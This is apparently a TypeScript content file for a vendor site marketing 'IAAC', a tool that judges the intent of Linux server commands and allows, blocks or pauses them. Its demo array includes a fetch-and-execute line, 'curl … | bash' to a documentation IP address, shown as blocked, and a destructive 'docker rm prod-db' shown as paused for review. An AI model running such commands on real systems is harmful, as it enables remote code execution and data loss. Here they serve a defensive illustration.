export const iaac = {
  name: "IAAC",
  fullName: "Intent-Aware Access Control",
  status: "available" as const,
  href: "/products/iaac",
  oneLiner: "Privileged commands on Linux servers, judged by intent and stopped before they run.",
  headline: "IAAC makes stolen credentials worthless.",
  summary:
    "It intercepts every command on a Linux server before it runs, judges its intent, and returns Allow, Block or Review in under a second, even when the user is root.",

  problem: {
    heading: "Privileged access means unlimited damage",
    body: "Today's controls each miss it. They decide who gets in, hunt for malware, or log what already happened. None of them judges what a valid admin is trying to do with the command in front of them.",
  },

  // "Permission isn't intent"
  gaps: [
    { control: "PAM", does: "Controls who gets the credential", gap: "Inside the session, the operator can still do anything" },
    { control: "EDR", does: "Hunts malware and anomalies", gap: "Treats a valid admin using native tools as normal" },
    { control: "SIEM / auditd", does: "Logs and alerts", gap: "Detects after the damage is done" },
    { control: "sudo / SELinux", does: "Enforces static permissions", gap: "No intent, blind to obfuscation and living-off-the-land" },
  ],

  steps: [
    {
      key: "see",
      title: "See every command",
      body: "A lightweight on-host agent intercepts interactive and background commands, backed by kernel-level enforcement.",
    },
    {
      key: "judge",
      title: "Judge its intent",
      body: "240+ rules mapped to MITRE ATT&CK, plus AI reasoning that runs on the customer's own server.",
    },
    {
      key: "decide",
      title: "Allow, Block or Review",
      body: "Safe work runs silently, harmful actions are blocked, and ambiguous ones pause for a human with an AI briefing.",
    },
  ],

  architecture: {
    enforcement: {
      title: "Enforcement plane",
      where: "On every protected Linux server",
      points: [
        "Lightweight on-host agent intercepts interactive and background commands",
        "Kernel-level enforcement backs the agent",
        "On-box AI reasoning: zero data egress for analysis",
        "Self-protecting, and fails open at the shell so admins are never locked out",
      ],
    },
    control: {
      title: "Control plane",
      where: "Multi-tenant, or self-hosted and air-gapped",
      points: [
        "Policy and the 240+ intent rules mapped to MITRE ATT&CK",
        "Review queue with AI briefings, dual approval and N-of-M quorum",
        "Tamper-evident, hash-chained audit log with one-click verified export",
        "Shared security graph across the AegisZ platform",
      ],
    },
  },

  capabilities: [
    { title: "On-box AI", body: "Zero data egress for AI analysis; runs fully air-gapped." },
    {
      title: "Dual approval and quorum",
      body: "Dual-approval and N-of-M quorum for destructive commands; the most catastrophic actions can never be released.",
    },
    { title: "Tamper-evident audit", body: "Hash-chained audit log with one-click verified export." },
    { title: "Never locks admins out", body: "Self-protecting agent that fails open at the shell." },
    { title: "Observe-first rollout", body: "Monitor mode first, then enforcement when you're ready." },
    { title: "Under a second", body: "Allow, Block or Review returned in under a second, even when the user is root." },
  ],

  compliance: ["PCI-DSS", "SOC 2", "ISO 27001", "HIPAA", "GDPR", "India's DPDP Act"],

  // Tier names only — no pricing on the site yet.
  deployment: [
    { name: "Basic", body: "Per protected server." },
    { name: "Medium", body: "Per protected server." },
    { name: "Enterprise", body: "Per protected server." },
    {
      name: "Sovereign",
      body: "A dedicated, air-gapped, self-hosted deployment for government, defence and the most regulated estates.",
      highlight: true,
    },
  ],

  roadmap: [
    { when: "Today", body: "Linux runtime enforcement, validated on a live production server." },
    { when: "Next", body: "Deeper SIEM/SOAR and ticketing integration, and hardened self-hosted delivery." },
    { when: "Then", body: "Windows, macOS, containers and Kubernetes." },
  ],
};

export type Verdict = "allow" | "block" | "review";

export const terminalDemo: { cmd: string; verdict: Verdict; reason: string }[] = [
  { cmd: "ls -a", verdict: "allow", reason: "Routine read-only listing" },
  { cmd: "curl -s http://203.0.113.7/x.sh | bash", verdict: "block", reason: "Remote script piped straight into a shell" },
  { cmd: "docker rm prod-db", verdict: "review", reason: "Destructive action on production, paused for approval" },
];
